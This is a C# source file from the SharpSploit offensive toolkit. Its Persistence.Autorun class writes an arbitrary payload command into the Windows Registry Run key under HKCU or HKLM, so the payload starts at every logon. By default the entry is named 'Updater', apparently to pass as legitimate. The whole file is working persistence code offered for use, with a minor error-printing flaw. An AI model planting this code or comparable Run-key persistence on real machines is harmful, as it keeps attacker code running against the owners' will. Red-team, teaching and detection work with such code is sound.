// Author: Ryan Cobb (@cobbr_io)
// Project: SharpSploit (https://github.com/cobbr/SharpSploit)
// License: BSD 3-Clause

using System;
using Microsoft.Win32;

namespace SharpSploit.Persistence
{
    /// <summary>
    /// Autorun is a class for abusing the Windows Registry to establish peristence.
    /// </summary>
    public class Autorun
    {
        /// <summary>
        /// Creates an autorun value in HKCU or HKLM to execuate a payload.
        /// </summary>
        /// <author>Daniel Duggan (@_RastaMouse)</author>
        /// <returns>Bool. True if execution succeeds, false otherwise.</returns>
        /// <param name="Name">Name for the registy value. Defaults to "Updater".</param>
        /// <param name="Value">The registry value.</param>
        /// <param name="TargetHive">The target hive. HKCU or HKLM.</param>
        public static bool InstallAutorun(string Value, Hive TargetHive, string Name = "Updater")
        {
            try
            {
                RegistryKey key;

                if (TargetHive == Hive.HKCU)
                {
                    key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                    key.SetValue(Name, Value, RegistryValueKind.ExpandString);
                    key.Close();
                }
                else if (TargetHive == Hive.HKLM)
                {
                    key = Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                    key.SetValue(Name, Value, RegistryValueKind.ExpandString);
                    key.Close();
                }

                return true;
            }

            catch (Exception e)
            {
                Console.Error.WriteLine("Error: ", e.Message);
            }

            return false;
            
        }

        public enum Hive
        {
            HKCU,
            HKLM
        }
    }
}
